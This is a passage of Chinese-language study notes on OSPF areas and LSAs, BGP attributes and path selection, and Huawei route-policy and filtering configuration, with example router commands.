<p>内容与LSA5几乎相同，但NSSA LSA仅在始发此LSA的NSSA内泛洪， 不能直接进入骨干网络，NSSA的ABR会将LSA7转换为5LSA注入骨干网络</p>
</blockquote>
<ul>
<li>[ASBR]  NSSA External NSA</li>
</ul>
<blockquote>
<p>骨干网络里面不会有LSA 7，只存在于NSSA</p>
</blockquote>
<h2 id="OSPF支持的网络类型👁️"><a href="#OSPF支持的网络类型👁️" class="headerlink" title="OSPF支持的网络类型👁️"></a>OSPF支持的网络类型👁️</h2><ul>
<li>点到点网络（Point-to-Point，P2P）</li>
</ul>
<p>[链路层协议]：PPP链路 HDLC链路</p>
<ul>
<li>点到多点网络（Point-to-Multipoint， P2MP ）</li>
</ul>
<p> [链路层协议]：手动设置</p>
<ul>
<li>广播型多路访问网络（Broadcast-Multi-Access，BMA）</li>
</ul>
<p>[链路层协议]：Ethernet以太网 FDDI光纤分布式数据接口</p>
<ul>
<li>非广播型多路访问网路（Non- Broadcast-Multi-Access， NBMA ）</li>
</ul>
<p>[链路层协议]：FR帧中继 ATM异步传输模式</p>
<ul>
<li>虚链路（Virtual Link）</li>
</ul>
<h2 id="DR和BDR"><a href="#DR和BDR" class="headerlink" title="DR和BDR"></a>DR和BDR</h2><h3 id="DR的作用"><a href="#DR的作用" class="headerlink" title="DR的作用"></a>DR的作用</h3><p>减少MA网络中报文交互的数量，节省链路资源</p>
<h3 id="BDR的作用"><a href="#BDR的作用" class="headerlink" title="BDR的作用"></a>BDR的作用</h3><p>作为DR的备份，时刻监视DR的状态，一旦DR出现故障就成为新的DR</p>
<h3 id="DR-BDR选取原则："><a href="#DR-BDR选取原则：" class="headerlink" title="DR/BDR选取原则："></a>DR/BDR选取原则：</h3><ol>
<li>比较优先级 priority，优先级大的会被选举为DR（优先级默认都为1）<br>（注意：若将优先级设为0，则不参与DR、BDR的选举）</li>
<li>优先级相同的情况下，Router-id大路由器就会被选举成DR</li>
<li>先运行ospf协议的会被选举成DR</li>
<li>一旦DR、BDR确定，正常情况下很难被更改</li>
</ol>
<h3 id="为什么要选举DR和BDR？在什么样的网络里选"><a href="#为什么要选举DR和BDR？在什么样的网络里选" class="headerlink" title="为什么要选举DR和BDR？在什么样的网络里选"></a>为什么要选举DR和BDR？在什么样的网络里选</h3><p>BMA和NBMA网络需要选举DR和BDR</p>
<p>好处</p>
<p>形成邻居状态，在没有选举之前，有$n *(n-1)/2$ 个邻居关系</p>
<p>选举之后，有$n-1$个邻居关系，通过邻居关系的数量来展开DR和BDR的好处</p>
<p>减少邻居关系，节约带宽资源</p>
<h3 id="不想让某些路由器参与DR与BDR的选举的做法🦴"><a href="#不想让某些路由器参与DR与BDR的选举的做法🦴" class="headerlink" title="不想让某些路由器参与DR与BDR的选举的做法🦴"></a>不想让某些路由器参与DR与BDR的选举的做法🦴</h3><p>将DR优先级设置为0，它就不会参与这个网段上DR/BDR的选取了，它的角色永远就是DR Other</p>
<h1 id="特殊区域"><a href="#特殊区域" class="headerlink" title="特殊区域"></a>特殊区域</h1><ul>
<li>普通区域</li>
</ul>
<p>缺省情况下，OSPF区域被定义为普通区域。包括标准区域和骨干区域(Area0)</p>
<ul>
<li>存根区域 Stub区域</li>
</ul>
<p>禁止LSA4 和LSA5泛洪，允许骨干网络进入的LSA3，同时ABR会自动下发LSA3的缺省路由</p>
<ul>
<li>完全存根区域 Totally Stub区域</li>
</ul>
<p>禁止LSA345泛洪，同时ABR会自动下发LSA3的缺省路由</p>
<ul>
<li>非完全末梢区域 NSSA Not-so-stubbt Area</li>
</ul>
<p>禁止从骨干网络进入的LSA45,但是允许本地区域注入AS外部的路由，外部路由在NSSA内以LSA7的方式泛洪。NSSA ABR下发一条LSA7缺省路由</p>
<ul>
<li>完全非完全末梢区域  Totally NSSA</li>
</ul>
<p>在NSSA基础上禁止从骨干网络进入的LSA3，同时NSSA ABR下发一条缺省的LSA3路由</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置区域类型为stub 无4 无5</span></span><br><span class="line">[sw-ospf-1-0.0.0.1] stub </span><br><span class="line"><span class="comment"># 设置区域类型为total stub 无3 无4 无5 </span></span><br><span class="line">[sw-ospf-1-0.0.0.1] stub no-summary</span><br><span class="line"><span class="comment"># 设置区域类型为nssa  只有 3类 5类 和 7类 只适用于小型</span></span><br><span class="line">[sw-ospf-1-0.0.0.1] total nssa</span><br><span class="line"><span class="comment"># 设置区域类型为nssa  只有 5类 和 7类 只适用于小型</span></span><br><span class="line">[sw-ospf-1-0.0.0.1] nssa no-summary</span><br></pre></td></tr></table></figure>

<p>| Area Type \<br>LSA类型 | 1&amp;2 | 3 | 4 | 5 | 7 |<br>| — | — | — | — | — | — |<br>| 普通区域 | 1 | 1 | 1 | 1 | 0 |<br>| 存根区域 | 1 | 1 | 0 | 0 | 0 |<br>| 完全存根区域 | 1 | 0 | 0 | 0 | 0 |<br>| NSSA区域 | 1 | 1 | 0 | 0 | 1 |</p>
<h1 id="路由重发布-路由引入"><a href="#路由重发布-路由引入" class="headerlink" title="路由重发布(路由引入)"></a>路由重发布(路由引入)</h1><blockquote>
<p>将路由信息从一种路由协议发布到另一种路由协议的操作</p>
</blockquote>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>在网络中部署路由重发布，可以使得路由信息能够在多种路由协议之间实现传递，从而全网的数据能够实现互通</p>
<ol>
<li>在RIP进程中import-route OSPF的路由进程</li>
<li>在OSPF进程中import-route RIP的路由进程</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在边界路由R2中</span></span><br><span class="line">[R2-rip-1]import-route ospf 1 cost 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认cost度量类型为2,指定从OSPF引入的路由条数为2，默认为0</span></span><br><span class="line">[R2-ospf-1]import-route rip 1 cost 10 <span class="built_in">type</span> 2</span><br></pre></td></tr></table></figure>

<aside>
🌟 LSA5 度量类型type = 1时 外部路由cost = 外部cost+内部cost

</aside>

<aside>
🌟 LSA5 度量类型type = 2时 外部路由cost = 外部cost

</aside>

<blockquote>
<p>引入其他路由</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 引入静态路由</span></span><br><span class="line">[R2-ospf-1]import-route static</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引入直连路由</span></span><br><span class="line">[R2-ospf-1]import-route direct</span><br></pre></td></tr></table></figure>

<p>引入成功后，域间路由的路由表中可以看到路由协议为O_ASE的外部路由信息</p>
<h1 id="BGP（Border-Gateway-Protocol-域间路由协议）"><a href="#BGP（Border-Gateway-Protocol-域间路由协议）" class="headerlink" title="BGP（Border Gateway Protocol 域间路由协议）"></a>BGP（Border Gateway Protocol 域间路由协议）</h1><p>边界网关协议是一种实现自治系统AS之间的路由可达，并选择最佳路由的矢量性协议。</p>
<h3 id="AS（Autonomous-System）"><a href="#AS（Autonomous-System）" class="headerlink" title="AS（Autonomous System）"></a>AS（Autonomous System）</h3><p>自治系统：指的是同一个组织管理下，使用相同策略的设备的集合</p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>路径矢量路由协议，基于TCP协议运行(port:179)</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
<li>能够承载大批量的路由信息，能够支撑大规模网络。</li>
<li>提供了丰富的路由策略，能够灵活的进行路由选路，并能指导邻居按策略发布路由。</li>
<li>能够支撑MPLS/VPN的应用，传递客户VPN路由</li>
<li>提供了路由聚合和路由衰减功能用于防止路由振荡，有效提高了网络的稳定性</li>
<li>使用TCP作为其传输层协议（端口号为179），增强网络的可靠性。</li>
</ol>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul>
<li>BGP使用TCP为传输层协议，TCP端口号179。路由器之间的BGP会话基于TCP连接而建立。</li>
<li>运行BGP的路由器被称为BGP发言者（BGP Speaker），或BGP路由器。</li>
<li>两个建立BGP会话的路由器互为对等体（Peer）。BGP对等体之间交换BGP路由表。</li>
<li>BGP路由器只发送增量的BGP路由更新，或进行触发更新（不会周期性更新）。</li>
<li>BGP具有丰富的路径属性和强大的路由策略工具。</li>
<li>BGP能够承载大批量的路由前缀，用于大规模的网络中。</li>
</ul>
<h2 id="对等体Peer"><a href="#对等体Peer" class="headerlink" title="对等体Peer"></a>对等体Peer</h2><h3 id="建立对等体的前提"><a href="#建立对等体的前提" class="headerlink" title="建立对等体的前提"></a>建立对等体的前提</h3><p>路由可达，能建立TCP连接</p>
<ul>
<li><strong>EBGP 外部对等体</strong></li>
</ul>
<blockquote>
<p>一般基于直连端口建立，若不是直连端口，则要修改EBGP报文中的<strong>TTL</strong>(TIME TO LIVE:到目的网段的剩余路由器(网段)跳数,若为0则目的地址不可达)字段，该字段默认为1，一般修改为2</p>
</blockquote>
<p>俩路由器处于不同自治系统(AS号不同)，且可以互通(即TCP可达)</p>
<ul>
<li><strong>IBGP内部对等体</strong></li>
</ul>
<blockquote>
<p>一般基于loopback接口建立，不要求设备必须直连</p>
</blockquote>
<p>俩路由器处于相同自治系统(AS号相同)，且可以互通(即TCP可达)</p>
<h3 id="如何建立对等体"><a href="#如何建立对等体" class="headerlink" title="如何建立对等体"></a>如何建立对等体</h3><aside>
🏵️ 直连 回环 非直连 可以相邻，也可以不相邻

</aside>

<p>基于非直连的接口建立的对等体需要的配置(静态路由等)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直连接口建立对等体</span></span><br><span class="line">bgp 12</span><br><span class="line">router-id 2.2.2.2</span><br><span class="line">peer 10.1.12.1 as-number 12 </span><br><span class="line">peer 10.1.23.3 as-number 300</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非直连接口建立对等体</span></span><br><span class="line">bgp 100</span><br><span class="line">router-id 1.1.1.1</span><br><span class="line">peer 2.2.2.2 as-number 200</span><br><span class="line">peer 2.2.2.2 connect-interface loopback 0</span><br><span class="line">peer 2.2.2.2 ebgp-max-hop 200</span><br></pre></td></tr></table></figure>

<h2 id="Origin源"><a href="#Origin源" class="headerlink" title="Origin源"></a>Origin源</h2><ul>
<li>i</li>
</ul>
<p>IGP路由协议</p>
<ul>
<li>?</li>
</ul>
<p>incomplete 不完整</p>
<h3 id="报文类型及作用🧐"><a href="#报文类型及作用🧐" class="headerlink" title="报文类型及作用🧐"></a>报文类型及作用🧐</h3><p><strong>Open</strong></p>
<p>(TCP连接成功后发送)协商BGP邻居的各项参数，建立邻居关系</p>
<p><strong>Update</strong></p>
<p>(路由变化时发送)发送BGP路由信息</p>
<p><strong>Notification</strong></p>
<p>(运行中发现错误时发送)用于报告错误，中止对等体关系</p>
<p><strong>Keepalive</strong></p>
<p>(定时发送)用于维护对等体关系</p>
<p>Route-refresh</p>
<p>(路由策略发生变化时发送)请求对等体重新通告路由，只有支持路由刷新的BGP设备会发送和响应此报文</p>
<p>TTL(EBGP,联邦成员EBGP)</p>
<p>与OSPF中“邻居”概念类似，但不一定是临接关系</p>
<h2 id="路由发布"><a href="#路由发布" class="headerlink" title="路由发布"></a>路由发布</h2><p>可以将路由表中的直连路由、静态路由或通过IGP协议学习到的路由发布到BGP</p>
<h3 id="network"><a href="#network" class="headerlink" title="network"></a>network</h3><p>一次只能发布一个网段</p>
<h3 id="import-route"><a href="#import-route" class="headerlink" title="import-route"></a>import-route</h3><p>一次能引入多个网段</p>
<h3 id="aggregate"><a href="#aggregate" class="headerlink" title="aggregate"></a>aggregate</h3><p><strong>手动路由汇总</strong></p>
<p>通告汇总路由，明细路由也会被通告，且通告会丢失明细路由的路径属性，如as_path</p>
<p><strong>自动路由汇总</strong></p>
<p><code>summary automatic</code> 开启自动汇总 但不会通告明细路由</p>
<p><strong>关键字</strong></p>
<p>detail-suppressed </p>
<p>抑制明细路由</p>
<p>as-set</p>
<p>通告时继承明细路由的路径属性（如AS_PATH）</p>
<p>suppress-policy {policyname}</p>
<p>通告时选择性地抑制明细路由</p>
<p>atrribute-policy {policyname}</p>
<p>设置汇总路由属性</p>
<p>origin-policy {policyname}</p>
<p>将某条或多条明细路由作为触发产生汇总路由的条件</p>
<ul>
<li>应用范围</li>
<li>对于多个网络如何进行汇总</li>
</ul>
<h2 id="AS内的环路和措施"><a href="#AS内的环路和措施" class="headerlink" title="AS内的环路和措施"></a>AS内的环路和措施</h2><p>BGP是距离矢量路由协议，因此会有环路问题，为了解决环路问题，设置了水平分割，在水平分割的情况下，如果要实现BGPAS内全互联，则需要IBGP全互联，这会导致路由器需要维护大量TCP和BGP连接，并且AS内BGP网络的可扩展性较差，因此有两种方案解决，一是实用路由反射器，二是BGP联邦。</p>
<h2 id="IBGP水平分割"><a href="#IBGP水平分割" class="headerlink" title="IBGP水平分割"></a>IBGP<strong>水平分割</strong></h2><p>路由器不会将自己从IBGP对等体中学习到的路由条目再传递给其他IBGP对等体</p>
<p><strong>产生原因</strong><br>AS_Path属性仅在路由离开AS时才会被更改，而BGP路由在AS内部传递时，路由的AS_Path属性值不会发生改变，如此一来，IBGP路由的防环就无法依赖AS_Path了。</p>
<h2 id="路由反射器（Route-Reflector，RR）"><a href="#路由反射器（Route-Reflector，RR）" class="headerlink" title="路由反射器（Route Reflector，RR）"></a><strong>路由反射器（Route Reflector，RR）</strong></h2><h3 id="角色：RR-Client"><a href="#角色：RR-Client" class="headerlink" title="角色：RR,Client"></a><strong>角色：RR,Client</strong></h3><ol>
<li>如果该路由学习自非Client IBGP对等体，则反射给自己所有的Client</li>
<li>如果路由学习自Client，则反射给所有非Client IBGP对等体和除了该Client之外的所有Client</li>
<li>如果路由学习自EBGP对等体，则发送给所有Client和非Client IBGP对等体</li>
</ol>
<h3 id="防环"><a href="#防环" class="headerlink" title="防环"></a><strong>防环</strong></h3><p>源ID(Originator_ID)</p>
<ul>
<li>如果路由为本地AS始发:则Originator_ID被设置为BGP路由宣告者的Router-ID</li>
<li>如果路由为非本地AS始发:则Originator_ID被设置为本地AS的边界路由器的Router-ID</li>
<li>如果AS内存在多个RR:则Originator_ID属性由第一个RR创建，并且不被后续的RR(若有) 所更改</li>
</ul>
<aside>
⚠️ 当BGP路由器收到一条携带Originator_ID属性的IBGP路由，并且Originator_ID属性值与自身的Router-ID相同，则它会忽略关于该条路由的更新(因为这代表出现了路由环路)

</aside>

<p>路由反射簇列表(ClusterList）</p>
<p>路由反射簇包括反射器RR及其Client。一个AS内允许存在多个路由反射簇。</p>
<p>每一个簇都有唯一的簇ID（Cluster-ID，缺省时为RR的BGP Router-ID ）。</p>
<p>当一条路由被反射器反射后，该RR（该簇）的Cluster_ID就会被添加至路由的Cluster_list属性中。</p>
<aside>
⚠️ 当RR收到一条携带Cluster_list属性的BGP路由，且该属性值中包含该簇的Cluster_ID时，RR认为该条路由存在环路，因此它将忽略关于该条路由的更新。

</aside>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置本机为RR 并为Cluster指定Client</span></span><br><span class="line">peer 1.1.1.1 reflect-client</span><br><span class="line"><span class="comment"># Client无需配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改ClusterID</span></span><br><span class="line">reflector cluster-id 22.22.22.22</span><br></pre></td></tr></table></figure>

<h2 id="BGP联邦（Confederation）"><a href="#BGP联邦（Confederation）" class="headerlink" title="BGP联邦（Confederation）"></a><strong>BGP联邦（Confederation）</strong></h2><p>将IBGP变成联邦IBGP，不同联邦AS之间的IBGP变成特殊的联邦EBGP。联邦内的AS号是使用TYPE34的特殊AS_PATH存储，因此对于联邦AS外部而言，联邦成员AS是不可见的。</p>
<aside>
⚠️ 联邦内成员AS号不参与AS_Path长度计算

</aside>

<p>通告给联邦的BGP路由，Next_Hop，MED，Local_Preference属性在整个联邦范围内保持不变</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># R3</span></span><br><span class="line">confederation <span class="built_in">id</span> 345</span><br><span class="line"></span><br><span class="line"><span class="comment"># R4</span></span><br><span class="line">confederation <span class="built_in">id</span> 345</span><br><span class="line">confederation peer-as 64513 <span class="comment"># 联邦IBGP</span></span><br><span class="line">peer 5.5.5.5 ebgp-max-hop 2 <span class="comment"># 联邦EBGP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># R5</span></span><br><span class="line">confederation <span class="built_in">id</span> 345</span><br><span class="line">confederation peer-as 64512</span><br><span class="line">peer 4.4.4.4 ebgp-max-hop 2</span><br></pre></td></tr></table></figure>

<h2 id="AS间的防环"><a href="#AS间的防环" class="headerlink" title="AS间的防环"></a>AS间的防环</h2><p>通过AS_PATH来实现，如果某台BGP路由器从其外部对等体收到某条路由的AS_PATH中包含有自己的AS号那么该路由器就知道出现了环路，因而丢弃该路由</p>
<h2 id="BGP路径属性"><a href="#BGP路径属性" class="headerlink" title="BGP路径属性"></a>BGP路径属性</h2><p><strong>公认必遵</strong></p>
<p>所有BGP路由器都能识别，并且Update报文中必须携带</p>
<p>如 Origins   AS_Path   Next-hop</p>
<p><strong>公认自决</strong></p>
<p>所有的BGP路由器都能识别，但不要求必须包含在Update报文中</p>
<p>如 Local-Preference   Atomic_Aggregate</p>
<p><strong>可选属性</strong></p>
<ul>
<li>可选传递</li>
</ul>
<p>可以不支持但是应该转发给支持的路由 如Community to</p>
<ul>
<li>可选非传递</li>
</ul>
<p>可以不支持也不转发 如 MED   Originator_ID   Cluster_list   *pre_value</p>
<ul>
<li><strong>属性解析</strong>  <strong>Preferred-value 优先值</strong>  华为私有的路径属性，取值范围：0~65535；该值越大，则路由越优先  Preferred-Value只能在路由器本地配置，而且只影响本设备的路由优选。该属性不会传播给任何BGP对等体  路由器本地始发的BGP路由默认的Preferred-Value值为0，从其他BGP对等体学习到的路由默认    Preferred-Value也为0。  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改Preferrred-value</span></span><br><span class="line">peer 5.5.5.5 preferred-value 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用route-policy修改Preferred-Value</span></span><br><span class="line">apply preferred-value 10</span><br></pre></td></tr></table></figure>
  <strong>Local-Preference 本地优先级</strong>   缺省为100，值越大越优  只能传递给IBGP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改Local_Preference</span></span><br><span class="line">bgp default local-preference 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过route-policy修改Local_Preference</span></span><br><span class="line">apply local-preference 200</span><br></pre></td></tr></table></figure>
  <strong>本地生成的路由</strong>  包括network，import-route，手工汇总和自动汇总引入的路由   aggregate手动汇总路由&gt;summary automatic自动汇总路由&gt;network宣告的路由&gt;import-route重引入的路由&gt;从邻居学习的路由  <strong>AS_PATH</strong>  是一个序列，包含了经过了所有as的编号<ul>
<li>路由在被通告给EBGP对等体时，路由器会在该路由的AS_Path中追加上本地的AS号</li>
<li>路由被通告给IBGP对等体时，AS-path不会发生改变</li>
</ul>
  <strong>作用</strong>  确保确保路由在EBGP对等体之间传递无环；另外也作为路由优选的衡量标准之一  <strong>类型</strong><ul>
<li>AS_Sequence</li>
</ul>
  一个去往特定目的地所经路径上的有序AS号列表<ul>
<li>AS_confed_sequence</li>
</ul>
  一个去往特定目的地所经路径上的有序AS号列表，此AS列表是本地联邦中的AS<ul>
<li>AS_Set</li>
</ul>
  一个去往特定目的的所经路径上的无序AS号列表<ul>
<li>AS_confed_set</li>
</ul>
  一个去往特定目的的所经路径上的无需AS号列表，此AS列表是本地联邦中的AS  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过route-policy修改AS_PATH</span></span><br><span class="line">apply as-path 100 additive</span><br></pre></td></tr></table></figure>
  <strong>Origin</strong>  标识了路由起源  IGP(network的路由)&gt;EGP(重发布EGP的路由)&gt;Incomplete(import的不完全的路由)  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过route-policy修改Origin</span></span><br><span class="line">apply origin incomplete</span><br></pre></td></tr></table></figure>
  <strong>MED (Multi Exit Discriminator)</strong>  是一种度量值，用于向外部对等体指出进入本AS的首选路径，即当进入本AS的入口有多个时，AS可以使用MED动态地影响其他AS选择进入的路径  MED属性值越小则BGP路由越优  MED主要用于在AS之间影响BGP的选路。MED被传递给EBGP对等体后，对等体在其AS内传递路由时，携带该MED值，但将路由传递给其EBGP对等体时，默认不会携带MED属性  <aside>
  ⚠️ 如果路由没有MED属性，BGP选路时将该路由的MED值按缺省值0来处理；执行bestroute med-none-as-maximum命令后，BGP选路时将该路由的MED值按最大值4294967295来处理
  
  </aside>
  
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过route-policy修改MED</span></span><br><span class="line">apply cost 999</span><br></pre></td></tr></table></figure>
  <strong>Next_Hop</strong>  指定到达目标网络的下一跳地址  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改BGP路由下一条为自身</span></span><br><span class="line">pper 10.1.12.1 next-hop-local</span><br></pre></td></tr></table></figure>
  <strong>Community</strong><ul>
<li>no-advertise  不再传递给其他任何BGPPeer</li>
<li>no-export  不再传递给其他任何EBGPPeer(联邦EBGP除外)</li>
<li>no-export-subconfed 不能再传递给其他任何EBGPPeer(包括联邦EBGP)</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">	<span class="comment"># 下发缺省路由</span></span><br><span class="line">default-route originate</span><br><span class="line"></span><br><span class="line">default-route-advertise always</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="BGP-路由优选规则"><a href="#BGP-路由优选规则" class="headerlink" title="BGP 路由优选规则"></a>BGP 路由优选规则</h2><ol>
<li><strong>更大的Preferred-value</strong></li>
<li><strong>更大的Local-Preference</strong></li>
<li><strong>起源于本地</strong></li>
<li><strong>AS_Path更短</strong></li>
<li><strong>Origin(IGP&gt;EGP&gt;Incomplete)</strong></li>
<li><strong>MED更小</strong></li>
<li><strong>EBGP通告的路由</strong></li>
<li><strong>Next_Hop的IGP度量值更小的路由</strong></li>
<li>BGP路由负载分担</li>
<li>Cluster_List更短</li>
<li>Router-ID更小的BGP对等体发来的路由</li>
<li>PeerID更小的对等体发来的路由</li>
</ol>
<hr>
<h1 id="RP路由策略和PBR策略路由"><a href="#RP路由策略和PBR策略路由" class="headerlink" title="RP路由策略和PBR策略路由"></a>RP路由策略和PBR策略路由</h1><h2 id="RP和PBR的区别"><a href="#RP和PBR的区别" class="headerlink" title="RP和PBR的区别"></a>RP和PBR的区别</h2><p>RP作用于路由，PBR是在路由存在的基础上作用于数据包</p>
<h2 id="路由策略"><a href="#路由策略" class="headerlink" title="路由策略"></a>路由策略</h2><p><strong>路由策略是一套用于对路由信息进行过滤、属性设置等操作的方法，通过对路由的控制从而影响数据流量的转发操作</strong></p>
<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><aside>
⚠️ 作用对象是路由信息,从控制层面实现路由的过滤和属性值的修改

</aside>

<ol>
<li>控制路由（引入，发布）</li>
<li>修改路由条目中的属性值</li>
</ol>
<h3 id="route-policy"><a href="#route-policy" class="headerlink" title="route-policy"></a>route-policy</h3><blockquote>
<p>路由策略工具 主要实现路由过滤和路由属性设置等功能 <code>隐含Deny</code></p>
</blockquote>
<p><strong>if-match</strong></p>
<aside>
⚠️ 若不指定if-match 则所有路由信息都会通过该节点过滤

</aside>

<ul>
<li>acl</li>
<li>cost</li>
<li>interface</li>
<li>ip ( next-hop | router-source | group-address )</li>
<li>ip-prefix</li>
<li>route-type</li>
<li>tag</li>
</ul>
<p><strong>apply</strong></p>
<aside>
⚠️ 若不指定if-match 则所有路由信息都会通过该节点过滤

</aside>

<ul>
<li>cost</li>
<li>cost-type { type-1 | type-2 }</li>
<li>ip-address next-hop</li>
<li>preference</li>
<li>tag</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">route-policy RP permit node 1</span><br><span class="line">if-match x1</span><br><span class="line">if-match x2</span><br><span class="line">apply y1</span><br></pre></td></tr></table></figure>

<p>只注入172.16.1.0/24,并设置cost = 20</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用ACL2000</span></span><br><span class="line">acl 2000 </span><br><span class="line"><span class="comment"># 只能匹配IP地址 所以在这里 0.0.0.0 &lt;=&gt; 0.0.0.255</span></span><br><span class="line">rule permit <span class="built_in">source</span> 172.16.1.0 0.0.0.0 </span><br><span class="line"></span><br><span class="line">route-policy RP permit node 10 <span class="comment"># 创建route-policy RP  进入节点10</span></span><br><span class="line"><span class="comment"># 调用ACL2000 ACL中隐藏的条目(huawei是permit all) 不会被隐含</span></span><br><span class="line"><span class="comment"># 因此引入后，默认仍是使用</span></span><br><span class="line">ospf中的deny all</span><br><span class="line">if-match acl 2000 </span><br><span class="line">apply cost 20 <span class="comment"># 将路由cost设置为20</span></span><br><span class="line"></span><br><span class="line">ospf 1 </span><br><span class="line">import-route direct route-policy RP <span class="comment"># 路由引用时应用route-policy RP </span></span><br></pre></td></tr></table></figure>

<p>引入路由时保留cost值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># [R1] </span></span><br><span class="line">ip route-static 10.0.1.0 24 172.16.1.2</span><br><span class="line">ip route-static 10.0.2.0 24 172.16.11.2</span><br><span class="line"></span><br><span class="line">acl 2000</span><br><span class="line"></span><br><span class="line">acl 2001</span><br><span class="line"></span><br><span class="line">route-policy RP permit node 10</span><br><span class="line">if-match acl 2000</span><br><span class="line">apply cost 10</span><br><span class="line"></span><br><span class="line">route-policy RP permit node 20</span><br><span class="line">if-match acl 2001</span><br><span class="line">apply cost 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># [R2] 值相反设置</span></span><br></pre></td></tr></table></figure>

<aside>
⚠️ 对于同一个Route-Policy节点，命令if-match acl和命令if-match ip-prefix不能同时配置，后配置的命令会覆盖先配置的命令

</aside>

<h3 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h3><aside>
⚠️ ACL只能匹配路由的目的网路地址，不能匹配到路由的目的网络掩码

</aside>

<h3 id="ip-prefix🌰"><a href="#ip-prefix🌰" class="headerlink" title="ip-prefix🌰"></a>ip-prefix🌰</h3><blockquote>
<p>前缀列表匹配路由的可控性比ACL高 可匹配路由条目中的网络号及掩码 精确度高。<code>隐含Deny</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 路由的网络地址的前22位必须有192.168.4.0前22位相同</span></span><br><span class="line"><span class="comment"># 且目标网络掩码必须大于等于24 greater-equal是大于等于 小于等于是less-equal </span></span><br><span class="line">ip ip-prefix abdc permit 192.168.4.0 22 greater-equal 24</span><br><span class="line"><span class="comment"># 等价于 （隐含了掩码&gt;22）</span></span><br><span class="line">ip ip-prefix abcd index 10 permit 192.168.4.0 22 greater-equal 24</span><br></pre></td></tr></table></figure>

<ul>
<li>例  <img src="Untitled.png" alt="Untitled">  <img src="Untitled%201.png" alt="Untitled">  <img src="Untitled%202.png" alt="Untitled"><hr>
  <img src="Untitled%203.png" alt="Untitled"></li>
</ul>
<h3 id="filter-policy"><a href="#filter-policy" class="headerlink" title="filter-policy"></a>filter-policy</h3><blockquote>
<p>用于控制路由更新，接受</p>
</blockquote>
<ul>
<li>只能过滤路由信息，无法过滤LSA，不能修改路由属性值</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令格式</span></span><br><span class="line">filter-policy &#123; acl-number | acl-name acl-name &#125; import | <span class="built_in">export</span> [ interface-type interface-number ]</span><br><span class="line"></span><br><span class="line">filter-policy gateway ip-prefix-name import | <span class="built_in">export</span></span><br><span class="line"></span><br><span class="line">filter-policy ip-prefix ip-prefix-name [ gateway ip-prefix-name ] import | <span class="built_in">export</span> [ interface-type interface-number ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># RIP 中对路由进行过滤</span></span><br><span class="line">ip ip-prefix 1 deny 192.168.3.0 24</span><br><span class="line">ip ip-prefix 1 permit 0.0.0.0 0 less-equal 32</span><br><span class="line">rip 1</span><br><span class="line">filter-policy ip-prefix 1 <span class="built_in">export</span> GigabitEthernet0/0/1 <span class="comment"># 过滤发布路由</span></span><br><span class="line"></span><br><span class="line">filter-policy ip-prefix 1 import GigabitEthernet0/0/1 <span class="comment"># 过滤接收路由</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># OSPF 中对路由进行过滤</span></span><br><span class="line">ip ip-prefix 1 deny 192.168.3.0 24</span><br><span class="line">ip ip-prefix 1 permit 0.0.0.0 0 less-equal 32</span><br><span class="line">ospf 1</span><br><span class="line">filter-policy ip-prefix 1 import <span class="comment"># 过滤接收路由</span></span><br><span class="line"></span><br><span class="line">import-route direct</span><br><span class="line">filter-policy ip-prefix 1 <span class="built_in">export</span> <span class="comment"># 过滤发布路由</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="策略路由"><a href="#策略路由" class="headerlink" title="策略路由"></a>策略路由</h2><p><strong>操作对象是数据包，在已有路由表的情况下，不按照路由进行转发，而是根据需要，按照某种策略改变数据包的转发路径</strong></p>
<h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><aside>
⚠️ 作用对象是数据包,从转发层面保证数据包按指定的路径转发

</aside>

<p>改变数据包转发路径</p>
<h3 id="MQC-Modular-Qos-Command-line-Interface：模块化QoS命令行接口"><a href="#MQC-Modular-Qos-Command-line-Interface：模块化QoS命令行接口" class="headerlink" title="MQC (Modular Qos Command-line Interface：模块化QoS命令行接口)"></a>MQC (Modular Qos Command-line Interface：模块化QoS命令行接口)</h3><p>流分类traffic classifier</p>
<p>流行为traffic behavior</p>
